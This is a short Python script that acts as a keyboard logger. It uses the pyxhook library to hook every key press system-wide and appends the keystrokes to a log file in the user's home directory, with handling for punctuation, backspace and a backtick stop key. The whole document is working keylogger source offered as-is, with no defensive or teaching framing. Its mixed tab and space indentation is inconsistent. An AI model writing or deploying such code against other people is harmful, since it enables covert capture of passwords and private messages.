import pyxhook
import os.path
homedir = os.path.expanduser('~')
log_file=homedir+'/HookMyKeys/HookMyKeys.log' #this is the path of log file

def KeyPress(event):
  logfile=open(log_file,'a')
  
  if event.Ascii==32 or event.Key=='Tab':
  	logfile.write(' ')
  elif event.Key=='Return':
	logfile.write('\n')
	
  elif event.Key=='BackSpace':
	size=logfile.tell()
	logfile.truncate(size-1)

  elif event.Key=='Shift_R' or event.Key=='Shift_L' :
	logfile.write('')
  elif event.Key=='exclam':
	logfile.write('!')
  elif event.Key=='at':
	logfile.write('@')
  elif event.Key=='numbersign':
	logfile.write('#')
  elif event.Key=='dollar':
	logfile.write('$')
  elif event.Key=='percent':
	logfile.write('%')
  elif event.Key=='asciicircum':
	logfile.write('^')
  elif event.Key=='ampersand':
	logfile.write('&')
  elif event.Key=='asterisk':
	logfile.write('*')
  elif event.Key=='parenleft':
	logfile.write('(')
  elif event.Key=='parenright':
	logfile.write(')')
  elif event.Key=='minus':
	logfile.write('-')
  elif event.Key=='underscore':
	logfile.write('_')
  elif event.Key=='slash':
	logfile.write('/')
  elif event.Key=='period':
	logfile.write('.')


  elif event.Ascii==96:
	logfile.write('\n')
	logfile.close()
    	hooked.cancel()
  else:
	logfile.write(event.Key)

hooked=pyxhook.HookManager()
hooked.KeyDown=KeyPress
hooked.HookKeyboard()
hooked.start()

